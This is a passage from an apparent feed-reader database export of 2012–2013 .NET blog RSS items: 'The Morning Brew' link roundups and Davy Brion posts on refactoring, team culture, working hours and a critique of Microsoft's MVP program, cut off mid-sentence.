src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/yY_0JJKa0Wk\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1087}}
{"k":"0000000084","o":"0000004066","v":"001"}
{"_id":1088,"_uid":1088,"_dt":1373742620870,"_s":"33911cfe08f8d2b76741773bb92b7052"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/kdBJdGkx2-M/","title":"The Morning Brew #1385","published":{"$wrap":"$date","v":1372236477000,"h":"2013-06-26T08:47:57.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.lessthandot.com/index.php/DataMgmt/DBProgramming/MSSQLServer/sql-server-2014-ctp1-available\">SQL Server 2014 CTP1 Available for download</a> - SQLDenis highlights the availability of the first CTP release of SQL Server 2014, available to download and try out, as well as available in the Azure Gallery where you can get a pre-configured Azure Virtual Machine image,</li><li><a href=\"http://www.jasonvolpe.com/sql-server-2014-ctp-publically-available-now/\">SQL Server 2014 CTP Publically Available Now!</a> - Jason Volpe highlights the SQL Server 2014 CTP release, and discusses some of the key new features included in the release.</li><li><a href=\"http://blogs.msdn.com/b/benjaminperkins/archive/2013/06/25/what-s-new-in-iis-8-5.aspx\">What’s new in IIS 8.5 - Microsoft Internet Information Services 8.5 New Features</a> - Benjamin Perkins shares a look at the new features included in IIS 8.5, available in the Windows Server 2012 R2 edition, including Event Tracing for Windows support, Improved logging, dynamic site activation, and idle worker process paging out.</li></ul><h3>Information</h3><ul><li><a href=\"http://paulstovell.com/blog/convention-based-rest-api-with-documentation\">Convention-based HTTP API on top of Nancy (with documentation!)</a> - Paul Stovell shares an update on the rebuilding of his Octopus Deploy products API with a new convention based HTTP API running on top of the NancyFX Framework.</li><li><a href=\"http://www.mindscapehq.com/blog/index.php/2013/06/20/be-a-better-developer-octopus-deploy/\">Be a better developer: Octopus Deploy</a> - The folks over at MindScape are running a series of posts looking at the software that they rely on to help build quality applications, and in this post John-Daniel Trask takes a look at their use of Octopus Deploy</li><li><a href=\"http://www.codeproject.com/Articles/611731/Working-with-Units-and-Amounts\">Working with Units and Amounts</a> - Rudi Breedenraedt discusses the importance of knowing the units your quantities are measured in, and explores how you can help track of them in code using specific types for different units, sharing code examples.</li><li><a href=\"http://lostintangent.tumblr.com/post/4202489524/c-api-design-type-inference-named-parameters-and\">C# API Design: Type Inference, Named Parameters, and Generic Delegates</a> - ‘Lost In Tangent’ takes a look at some of the more modern C# language features which allow you to build more complex yet discoverable APIs</li></ul><h3>Community</h3><ul><li><a href=\"http://blogs.msdn.com/b/jennifer/archive/2013/06/25/build-2013-and-microsoft-store-opening-in-troy-mi.aspx\">BUILD 2013 and Microsoft Store opening in Troy, MI</a> - Jennifer Marsman highlights the start of this year’s //build event today, at 9am Pacific, and shares some links to help you keep on top of the news and announcements, including the details of the live stream.</li><li><a href=\"http://blogs.msdn.com/b/ukmsdn/archive/2013/06/25/teched-europe-live-streams-25th-28th-june-via-channel9-msdn.aspx\">TechEd Europe Live Streams 25th - 28th June via Channel9 MSDN</a> - Lee Stott also highlights the TechEd Europe conference underway in Madrid.  As with the US Tech Ed there is a huge range of sessions on a vast range of topics, and there are live streams available via Channel 9</li><li><a href=\"http://www.dddmelbourne.com/\">DDD Melbourne - Sat 20th July</a> - The Developer Developer Developer series of events has spread well beyond the UK, and Saturday 20th July sees the 4th DDD Melbourne taking place.  Registration is open now.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/kdBJdGkx2-M\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1088}}
{"k":"0000000084","o":"0000002949","v":"001"}
{"_id":1089,"_uid":1089,"_dt":1373742620870,"_s":"5c58ca6eed80e98016db7a16c633cea3"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/eYWrehqh2WY/","title":"The Morning Brew #1378","published":{"$wrap":"$date","v":1371458324000,"h":"2013-06-17T08:38:44.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://weblogs.asp.net/scottgu/archive/2013/06/14/windows-azure-major-updates-for-mobile-backend-development.aspx\">Windows Azure: Major Updates for Mobile Backend Development</a> - Scott Guthrie announces the latest batch of improvements to the Windows Azure Mobile Services, including a .NET API available via NuGet, Android push notifications, free database and websites and much more</li><li><a href=\"http://blog.getglimpse.com/2013/06/16/glimpse-1-4-2-released/\">Glimpse 1.4.2 released</a> - Anthony van der Hoorn announces another minor update to address some reported issues in Glimpse 1.4, with a handful of issues addressed in the Glimpse.Core module.</li><li><a href=\"http://geekswithblogs.net/joycsharp/archive/2013/06/16/announcement-employee-info-starter-kit-v6.0asp.net-mvc-edition-is-released.aspx\">Announcement: Employee Info Starter Kit (v6.0-ASP.NET MVC Edition) is Released</a> - Ashraful Alam Joy highlights the release of the 6th version of the Employee Info Starter Kit, a fully formed application running on ASP.NET MVC4, Entity Framework 4.3 and SQL Compact, a great learning tool, and also a starting point for your own applications of this nature.</li></ul><h3>Information</h3><ul><li><a href=\"http://www.strathweb.com/2013/06/overriding-filters-in-asp-net-web-api-vnext/\">Overriding filters in ASP.NET Web API vNext</a> - Filip W takes a look at the next release of Web API and explores how you can override filters, addressing one of the things which is currently very difficult to achieve.</li><li><a href=\"http://www.nsprogrammer.com/2013/06/logging-to-disk-most-important-part-of.html#more\">Logging: The Most Important Part of Any Application</a> - NSProgrammer discusses the importance of good logging in your applications, looking the top 10 features that logging must provide to be useful</li><li><a href=\"http://blog.mayurtendulkar.com/2013/06/using-raygun-for-logging-in-windows.html\">Using Raygun for Logging in Windows Phone Applications</a> - Tendulkar takes a look at integrating the Raygun.Io logging service/framework into a Windows Phone application to help gather information about your applications issues.</li><li><a href=\"http://www.hanselman.com/blog/StopDoingInternetWrong.aspx\">Stop Doing Internet Wrong</a> - Scott Hanselman discusses a bunch of things that we as web developers are still getting wrong when developing sites, ranging from bad linking to mobile sites to not marking up checkboxes correctly.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/eYWrehqh2WY\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1089}}
{"k":"0000000084","o":"0000004629","v":"001"}
{"_id":1090,"_uid":1090,"_dt":1373742620871,"_s":"4061d71e0bd23fa53b1eca32786c062f"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/txw3h0t-GYc/","title":"The Morning Brew #1382","published":{"$wrap":"$date","v":1371811312000,"h":"2013-06-21T10:41:52.000Z"},"starred":false,"read":false,"content":"<p><b> Slightly late edition today - I closed the laptop lid before it had published!</b></p><h3>Software</h3><ul><li><a href=\"http://blogs.telerik.com/Skimedic/posts/13-06-20/announcing-justcode-q2-2013\">Announcing JustCode Q2 2013</a> -  Phil Japikse announces the latest release of Telerik’s JustCode Visual Studio extension which brings with it a bunch of great new features including decompilation and debugging of dependent assemblies, new macros, test runner improvements and enhanced refactoring capabilities</li><li><a href=\"http://blogs.jetbrains.com/dotnet/2013/06/navigation-improvements-resharper-8/\">Navigation Improvements in ReSharper 8</a> - Dmitri Nesteruk gives a taste of the improvements being made to the code navigation capabilities of ReSharper, introducing their new Go To Everything functionality</li><li><a href=\"http://blogs.msdn.com/b/data__knowledge__intelligence/archive/2013/06/21/microsoft-sql-14-ctp1-product-guide.aspx\">Microsoft SQL 14 CTP1 Product Guide</a> - Deepthi Anantharam highlights the availability of SQL Server 2014 Product Guide documents which outline various use cases for SQL Server 2014 and how the new features of the platform help.</li></ul><h3>Information</h3><ul><li><a href=\"http://msmvps.com/blogs/jon_skeet/archive/2013/06/21/but-what-does-it-all-mean.aspx\">But what does it all mean?</a> - Jon Skeet discusses the importance of semantics in communication, discussing how he is now finding himself being picky about the semantics of data, and the importance of understanding the format of the data being discussed</li><li><a href=\"http://www.tikalk.com/net/c-language-specification-50\">C# Language Specification 5.0 </a> - Menny Rachmanny highlights the C# 5.0 language specification download from Microsoft, discussing why it is useful to have this document as a first port of call reference when you need to understand something about the C# language</li><li><a href=\"http://blogs.msdn.com/b/visualstudioalm/archive/2013/06/20/using-visual-studio-2013-to-diagnose-net-memory-issues-in-production.aspx\">Using Visual Studio 2013 to Diagnose .NET Memory Issues in Production - Visual Studio ALM + Team Foundation Server Blog - Site Home - MSDN Blogs</a> - Andrew B Hall gives us a taste of the Visual Studio 2013 capabilities for debugging and diagnosing memory issues in our .NET Applications, discussing the classes of memory issues we run into, and looking at examining an ASP.NET applications memory use with the new tooling.</li><li><a href=\"http://blogs.msdn.com/b/pranab/archive/2013/06/20/unit-testing-javascript-jquery-in-asp-net-mvc-project-using-qunit.aspx\">Unit Testing JavaScript/JQuery in ASP.Net MVC Project using QUnit Step by Step</a> - Pranab Paul takes us on a walkthrough of introducing unit testing of client side behaviours using QUnit in an ASP.NET MVC application which makes use of jQuery</li><li><a href=\"http://www.daedtech.com/introduction-to-unit-testing-part-3-unit-testing-sucks\">Introduction to Unit Testing Part 3: Unit Testing Sucks</a> - Erik Dietrich is mid series on a series looking at Unit Testing, and in this part suggests that you should leave TDD until you are familiar with unit testing, and discusses strategies to introduce unit testing to projects (and developers)</li><li><a href=\"http://kaczanowscy.pl/tomek/2013-06/you-shall-not-test-methods\">You Shall Not Test Methods</a> - Tomek Kaczanowski makes some good points about not specifically testing methods of classes but testing behaviours of classes</li><li><a href=\"http://lostechies.com/jimmybogard/2013/06/20/run-tests-explicitly-in-xunit-net/\">Run tests explicitly in xUnit.net</a> - Jimmy Bogard discusses his migration from NUnit to xUnit.NET, and his need to have tests run at development or build server built time, but not both, and looks at implementing this functionality for xUnit.NET.</li><li><a href=\"http://weblogs.asp.net/rchartier/archive/2013/06/20/getting-started-with-developing-for-the-agent-smartwatch.aspx\">Getting started with Developing for the AGENT SmartWatch </a> - Rob Chartier continues with his look at developing for the AGENT smart watch, exploring the tooling and SDK</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/txw3h0t-GYc\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1090}}
{"k":"0000000084","o":"0000003042","v":"001"}
{"_id":1091,"_uid":1091,"_dt":1373742620871,"_s":"06a5c4003d44b5a8c80ac0de4e86385b"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/BbaDji_ccF0/","title":"And… That’s All Folks","published":{"$wrap":"$date","v":1337029716000,"h":"2012-05-14T21:08:36.000Z"},"starred":false,"read":false,"content":"<p>I started blogging about 5 years ago, and over the years I've published 653 posts. This will be the last one. I had some specific personal goals in mind when I started blogging, and I've gotten everything I've wanted out of it, and more. I learned a lot, and I'm happy with a lot of the feedback I've gotten over the years. But the time has come to move on. I want to get back to writing more code instead of writing about writing code. I've mostly enjoyed writing blog posts, but in the past year it has felt more like a chore than a hobby, so it's probably a good idea to just call it quits.</p><p>I'm not entirely sure yet what I'm going to do with the content on this blog. There's quite a few posts I surely want to keep around, but certainly not all of them. For now, I'm going to keep the blog up so everything stays available but after a while, I'm gonna shut it down. I might keep up some kind of static archive of my favorite posts, or I might just put them on GitHub in MarkDown format. If you have any suggestions on what I should do with it, I'd be happy to hear them.</p><p>I will remain active on <ahref=\"http://twitter.com/davybrion\">Twitter</a> and I plan to be more active on <ahref=\"http://github.com/davybrion\">GitHub</a> from now on. But the blogging thing ends here and now. I'd like to thank everyone for reading, especially the ones who've been around since the beginning. It's been an interesting ride for me, but it's time for something else <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=BbaDji_ccF0:1amUMIKr8i0:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=BbaDji_ccF0:1amUMIKr8i0:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=BbaDji_ccF0:1amUMIKr8i0:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=BbaDji_ccF0:1amUMIKr8i0:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/BbaDji_ccF0\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1091}}
{"k":"0000000084","o":"0000005683","v":"001"}
{"_id":1092,"_uid":1092,"_dt":1373742620871,"_s":"4901027a048f853b83c1a69490674646"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/vmRCqUkdXLU/","title":"Why Things Don’t Work In Your World","published":{"$wrap":"$date","v":1336935036000,"h":"2012-05-13T18:50:36.000Z"},"starred":false,"read":false,"content":"<p>A very common reaction for developers to have when they hear about new technical approaches or new approaches to team organization is \"yeah right, that won't work in the real world\" or \"that'll never work in our situation\". A lot of us have felt that way. I certainly have as well a few times in the past. The 2 most common excuses you'll hear for not believing something can work are:</p><ol><li><p>The people I work with aren't good/talented/disciplined enough to make this work.</p></li><li><p>It can't possibly work in our organization.</p></li></ol><p>The truth though, is that it's actually because of <em>you</em>. Whenever you say \"that won't work for us\" or something similar because of the people you work with, you immediately show your lack of faith in them. You might think that that lack of faith is justified, but that basically means you've given up all hope of making things better. You know it, and worst of all, <em>they know it too</em>. People who aren't trusted by their coworkers or superiors generally pick up on that rather quickly. Some of them will respond by putting in more effort and trying to do better. Others will become demotivated and wonder why they should even try because \"it's never good enough anyway\". At this point, your lack of trust in your coworkers becomes a self-fulfilling prophecy.</p><p>You might want to consider another approach. Think back on how you've responded to situations where you where challenged by coworkers or superiors but where it was clear that they trusted you and believed that you were capable of doing a better job. I'd bet that for most of you, it improved your motivation and your willingness to do better. It probably helped you bring out the best in you. You can use this to your advantage when you're trying to get better results out of your coworkers. It's quite simple really: it's all about how you approach someone. If you want somebody to do better, and you approach them in a positive manner you're much more likely to get better results. If however, they sense your distrust (and most people pick up on that quite easily), they will most likely be defensive or apprehensive. The odds are quite low that something good will come out of that.</p><p>If you want people to improve and do better, it's important to establish a culture where everybody knows that it's <em>ok</em> to make mistakes, and that every mistake is an opportunity for the whole team to get better. If that's not the case in your situation, what is preventing you from trying to get to that point? Even if you're not officially in a leadership position, there's no reason why you can't set the tone and <em>be a leader</em>. Start making an impact on one or two people and build off of that growth. Once you've got a few people convinced, it's much easier to bring the rest along with you. You don't need to shoot for the stars from the beginning either. Try to improve whatever it is you think needs improvement with small steps, in an iterative approach. Instead of thinking \"that will never work for my team\", think \"we're not quite ready for that <em>yet</em>, but we will be someday\".</p><p>If you believe you can't improve your way of working due to organizational reasons, it's important to also start with your team. It's easy for management to ignore the opinion of one person, but it gets progressively harder for them to ignore it as more and more people start asking for change. It's much easier to persuade management to try something new if you can show that the whole team believes it's worth a shot. Keep pressing the issue until you get the chance to try it for a short time. If you keep asking for it, management might just get tired of hearing it and who knows, they'll grant you some time to try it out. You'll never know if you stop trying.</p><p>Of course, you won't always succeed in convincing management or your coworkers. But you've gotta try. And if you keep hitting walls, you might actually be better off moving on to another job with other people instead of being frustrated in your current position. Even if you don't agree with what I'm saying in this post, you can't possibly disagree with this: not trying will get you nowhere.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/vmRCqUkdXLU\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1092}}
{"k":"0000000084","o":"0000003987","v":"001"}
{"_id":1093,"_uid":1093,"_dt":1373742620871,"_s":"b5d9d6c81f589713b4b3ca5efb0aa3a4"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/OFSdEDuJMHc/","title":"Three Strikes And You Refactor","published":{"$wrap":"$date","v":1336314970000,"h":"2012-05-06T14:36:10.000Z"},"starred":false,"read":false,"content":"<blockquote><p>The first time you do something, you just do it. The second time you do something similar, you wince at the duplication, but you do the duplicate thing anyway. The third time you do something similar, you refactor.</p></blockquote><p>That's a quote from Don Roberts, found in Martin Fowler's Refactoring book (page 58). That quote didn't really make me think twice at the time I read it, but it got stuck in my head later on when I heard it from someone who's always been very influential to me. When this person told me that this was one of his favorite rules, I was still in my \"no way dude, all code needs to be as clean as it can be\" phase. But it's really grown on me over the last few years. Now, just to avoid any confusion: this post is about <em>my interpretation</em> of 'Three Strikes And You Refactor', not about what may have been originally intended or what some people think of it now.</p><p>The most important thing I remember when learning about TDD was:</p><ol><li><p>Write a failing test</p></li><li><p>Do the simplest thing that could possibly work to make the test pass.</p></li><li><p>Refactor.</p></li></ol><p>With all the literature that's out there, as well as popular opinion on how important clean code is, it's tempting to go overboard with that 'refactor' step. It's tempting to go for the solution that is crispy clean. The solution that'll have your coworkers or peers go \"ohhh, now <em>that</em> is nice\". However, you really need to ask yourself the following question: \"is it really worth it?\". Wanting to make sure that every piece of code is perfect takes up a lot of time, and I've learned that it certainly isn't always worth it. Besides, it's quite easy to go off on a path of introducing new concepts and abstractions to your code that end up being totally unnecessary. If this increases complexity in parts that don't really matter, it ends up being a huge waste. Not only for the person who wrote it, but for every person who has to read it and comprehend it later on.</p><p>'Three Strikes And You Refactor' is a helpful rule of thumb here. Try to keep things as simple as possible and don't be afraid of a <em>little</em> duplication here or there. Once you find yourself (or a teammate) doing the same thing for a third time, it's worth cleaning up because that third time very often means that it wouldn't be the last time either. This way, you only introduce concepts and abstractions that are really needed, and enables you to avoid adding unnecessary cruft to the code.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OFSdEDuJMHc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1093}}
{"k":"0000000084","o":"0000005054","v":"001"}
{"_id":1094,"_uid":1094,"_dt":1373742620871,"_s":"b2b869524e5241799fbe08e4eff4ee85"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/uXaRMjqjhFA/","title":"It’s Not About The Number Of Hours You Put In","published":{"$wrap":"$date","v":1334864118000,"h":"2012-04-19T19:35:18.000Z"},"starred":false,"read":false,"content":"<p>There's been a lot of talk on twitter about the <ahref=\"http://501manifesto.org/\">501 Manifesto</a>. Be sure to read it if you haven't, because it's got some very good points, though I don't like the dig at people who contribute to open source since these people are having an ever increasing positive impact on our jobs. Anyways, the manifesto is about being a software developer without being defined by it. I actually think it's a healthy point of view.</p><p>I've always disagreed with this seemingly popular point of view or opinion that every developer should spend a lot of time outside of his/her working hours blogging or publishing their code on Github or contributing to open source. Those activities <em>can</em> be important but aren't necessarily so and the people doing them aren't inherently more valuable or important than developers who choose not to contribute to open source software or who don't feel the need to make a name for themselves. I also disagree with the notions that developers who are only involved with software development during their 8 working hours a day must be inferior or that they can't be passionate about it or that they'll never be great at it or any of that other crap that you'll sometimes hear people say.</p><p>I know some great developers who put their code out there and/or their thoughts by blogging. I also know some bad developers who put their code out there and/or their thoughts by blogging. I know some great developers who aren't involved with software development outside their working hours. I also know some bad developers who aren't involved with software development outside their working hours. There are good and bad developers on both sides of every situation you can come up with.</p><p>I think it depends a lot on what people do <em>during their 8 working hours</em>. Can we really say that developers who work 8 hours a day on challenging projects with strong co-workers in teams where knowledge is passed around continuously are missing out on anything if they don't really spend any other time on software development outside of work? That just doesn't make a lot of sense to me. If I look back on my own career so far, I've typically been rather passive outside of working hours in periods where I felt like I was working on cool things, where I was challenged, where I was learning a lot on the job. Conversely, I've always been much more involved with software development outside of work when I was working on things during working hours that I didn't find challenging or interesting or where I wasn't learning anything new. I'm guessing that this holds true for a lot of people, though certainly not all.</p><p>Of course, if you're not working on interesting things or continuously learning and improving on the job, it's your own responsibility to make sure that your skills and insights stay up to date. You don't <em>have</em> to put in the effort to do that, but if you don't, you don't really have a reason to complain either when you're not happy with the kind of work that you're doing. Your employer is not responsible for your career and your future, you are.</p><p>And if you are working on interesting things and continuously learning and improving on the job, you don't need to pressure yourself to do more outside of your working hours because certain people in the community say you should. A lot of people get involved with blogging and open source with the hope that it'll end up leading to more interesting work in the long term. Who knows, you might just be a step ahead of them already.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=uXaRMjqjhFA:Bygtonu7YhM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=uXaRMjqjhFA:Bygtonu7YhM:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/uXaRMjqjhFA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1094}}
{"k":"0000000084","o":"0000010700","v":"001"}
{"_id":1095,"_uid":1095,"_dt":1373742620872,"_s":"f4a9ae364f22f011267d7263d8f8fa1c"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/v0N7GPTJ8-o/","title":"Most Valuable Professionals? Give Me A Break.","published":{"$wrap":"$date","v":1334513509000,"h":"2012-04-15T18:11:49.000Z"},"starred":false,"read":false,"content":"<p>I've always been very skeptical of Microsoft's MVP award. Officially, Microsoft's MVP award stands for Most Valuable Professional, but its true meaning is probably closer to Most Valuable Promoter. The quality and integrity of the MVP's you know is probably dependent on the region in which you work. I work in Belgium, and over here the MVP program is, in my opinion, a joke. I'm going to discuss why I think it's a joke but keep in mind that this will depend on your region. I know that there are indeed great MVP's out there who do have professional integrity and true real world experience in some regions, but I certainly wouldn't be surprised if the state of the MVP program in Belgium occurs in other regions as well.</p><p>First of all, let's take a look at an image that Microsoft uses on its <ahref=\"http://mvp.support.microsoft.com/\">MVP page</a>:</p><p><imgsrc=\"http://davybrion.com/mvp.png\" alt=\"MVP image\" /></p><p>\"Independent Experts. Real world Answers.\"</p><p>This is indeed what the MVP program <em>should</em> be about. It is however the exact opposite of what I and many others in Belgium have experienced. Let's cover the words in those 2 sentences a bit more in-depth.</p><h3>Independent</h3><p>Most of the .NET MVP's in Belgium work for a handful of companies that happen to be big sponsors of every important Microsoft event in Belgium. Now, could it be possible that the best .NET developers in Belgium all work for these handful of companies? I highly doubt it. I know a lot of great developers in Belgium and none of them work for these companies. And I'm quite sure that none of those people are less valuable or knowledgeable than any of those MVP's. In my experience, there is hardly anything independent about the Belgian .NET MVP's. Most of them got their first MVP award while they were employed by sponsors or 'strategic partners' of Microsoft. Most of them tout the latest and greatest Microsoft technologies, pretty much unquestioned, even if it means contradicting their statements and positions when they were promoting the technology that Microsoft wanted them to promote 3 or 4 years ago. And they're never openly critical of anything Microsoft-related out of fear that it will negatively impact their chances of being renewed as an MVP. They may not work for Microsoft, but they are anything but independent of Microsoft.</p><h3>Experts</h3><p>This is a tough one. What makes one an expert? In some fields, people are considered to be experts based on the amount of research they've done. In other fields, people are considered to be experts based on what they've actually done. I don't think I'm going out on a limb here by saying that in the field of software development, what you've done <em>should</em> be more important than what you've researched or read about. In my opinion, an expert in a specific technology should have built at least one, and ideally more than one, non-trivial system using the technology in question and should be able to tell you about mistakes they've made, things you should avoid, and should never use examples that promote bad practices. I rarely hear MVP's talk about things you should avoid. I rarely hear MVP's talk about mistakes they've learned from. I routinely see examples from MVP's that make me cringe. I routinely hear MVP's promote technologies even though they haven't actually built anything impressive with it. I think of a lot of words when I see examples or proposed solutions by MVP's, but the word 'expert' unfortunately isn't one of them. This also applies to the Microsoft Extended Experts Team by the way. I can only question the validity of such a team if it contains people who are listed as experts of a particular technology when I happen to know for a fact that some of those people have never even used the technology they're supposed to be an expert in in a real world project. Let's be honest here: most of the MVP's and the MEET members simply aren't experts. They are people who have a strong interest in a particular (or more) technology and do their best to promote said technology. There's nothing wrong with that at all, but there's a huge difference between that and being an expert in something.</p><h3>Real world answers</h3><p>This one cracks me up the most because most of the Belgian MVP's hardly work on real world projects. And when they do, they typically work on \"multiple projects\" as they like to say it. For anyone who's ever worked on multiple projects at the same time: could you honestly say that your contributions were truly valuable to the end result? Let me put it differently: don't we all know that people generally produce the best results when they don't have to juggle too many things at once and can focus on as few things as possible? You will rarely hear about a Belgian MVP working full time on a non-trivial real-world project. A lot of them get to spend a certain number of paid hours each week on 'community work', which means blogging, writing articles for magazines, creating presentations for events, etc. When they're not working on that, you'll often find them talking on Twitter about pretty much anything but interesting or demanding work. And of course, their employers will occasionally send them to clients for a bit of consulting here or there, or to do a product demo. Unless these guys are putting in 60 to 80 hours a week (which I seriously doubt), I'm having trouble figuring out when exactly they do the kind of interesting work on real world projects that would enable them to provide answers based on real world experience.</p><p>It also doesn't help that I've frequently heard rather unflattering stories about these MVP's from people who've worked with them. It's pretty much always the same: they're not invested into the project, they spend too much time 'interacting with the community' and if you let them go near important parts of the code base, bad things usually happen. Now, I'm not the type of person who simply believes everything he hears. In fact, when it comes to matters like these, I generally only believe the stories I hear from people of whom I'm truly sure that they know what they're talking about. And if you've been reading this blog for a while, you'll know I'm rather critical and that I set the bar rather high when it comes to that.</p><p>Lastly, my personal working experience with MVP's has been abysmal as well. I once worked for a client where we had to get rid of 2 people because of how bad they performed in real world 